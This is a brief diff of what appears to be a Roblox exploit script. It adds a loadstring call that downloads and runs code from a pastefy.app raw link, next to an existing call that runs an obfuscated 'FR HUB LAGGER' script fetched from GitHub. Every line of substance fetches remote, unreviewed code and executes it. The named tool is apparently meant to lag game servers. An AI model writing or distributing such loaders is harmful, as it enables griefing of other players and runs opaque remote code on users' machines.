@@ -1,3 +1,6 @@
+-- float name
+loadstring(game:HttpGet("https://pastefy.app/R02mX1NW/raw"))()
+
 -- FR HUB LAGGER
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ook314745-svg/FRHUBLAGGER/refs/heads/main/obfuscated.lua%20(7).txt"))()
 
